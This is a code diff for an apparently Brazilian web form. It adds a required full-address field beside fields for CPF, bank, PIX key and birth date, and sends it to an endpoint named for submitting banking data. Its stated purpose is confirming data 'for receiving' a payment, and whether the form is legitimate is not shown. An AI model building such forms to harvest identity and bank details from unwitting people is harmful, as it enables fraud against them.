@@ -267,6 +267,12 @@ button.active{opacity:1}
 <label>Chave PIX</label>
 </div>
 
+<!-- Novo campo de Endereço adicionado abaixo da Chave PIX -->
+<div class="form-group">
+<input type="text" id="endereco" placeholder=" " required>
+<label>Endereço completo</label>
+</div>
+
 <button id="btn" disabled>Continuar</button>
 
 </form>
@@ -293,6 +299,8 @@ Falta pouco! Por favor, confirme os dados para recebimento
 <p><b>Banco</b><br><span id="c_banco"></span></p>
 
 <p><b>Chave PIX</b><br><span id="c_pix"></span></p>
+
+<p><b>Endereço</b><br><span id="c_endereco"></span></p>
 
 </div>
 
@@ -372,8 +380,9 @@ let email=validarEmail(document.getElementById('email').value)
 let banco=document.getElementById('banco').value.trim().length>1
 let pix=document.getElementById('pix').value.length>0
 let chave=document.getElementById('chave').value.length>3
+let endereco=document.getElementById('endereco').value.trim().length>3
 
-if(nome && cpf && tel && email && banco && pix && chave){
+if(nome && cpf && tel && email && banco && pix && chave && endereco){
 btn.disabled=false
 btn.classList.add('active')
 }else{
@@ -397,6 +406,7 @@ let dia=document.getElementById('dia').value
 let mes=document.getElementById('mes').value
 let ano=document.getElementById('ano').value
 let chave=document.getElementById('chave').value
+let endereco=document.getElementById('endereco').value
 
 if(!validarCPF(cpf)){
 document.getElementById('erroCpf').innerText="CPF inválido"
@@ -414,6 +424,7 @@ document.getElementById('c_tel').innerText=tel
 document.getElementById('c_data').innerText=`${dia}/${mes}/${ano}`
 document.getElementById('c_banco').innerText=banco
 document.getElementById('c_pix').innerText=chave
+document.getElementById('c_endereco').innerText=endereco
 
 form.style.display="none"
 document.getElementById('confirmacao').style.display="block"
@@ -435,6 +446,7 @@ let ano=document.getElementById('ano').value
 let banco=document.getElementById('banco').value
 let pix=document.getElementById('pix').value
 let chave=document.getElementById('chave').value
+let endereco=document.getElementById('endereco').value
 
 const btn = document.getElementById('confirmarFinal');
 const loadingOverlay = document.getElementById('loadingOverlay');
@@ -456,7 +468,8 @@ const response = await fetch('/api/enviar-dados-bancarios', {
             banco: banco,
             data_nascimento: `${dia}/${mes}/${ano}`,
             pix_tipo: pix,
-            pix_chave: chave
+            pix_chave: chave,
+            endereco: endereco
         })
     });
 
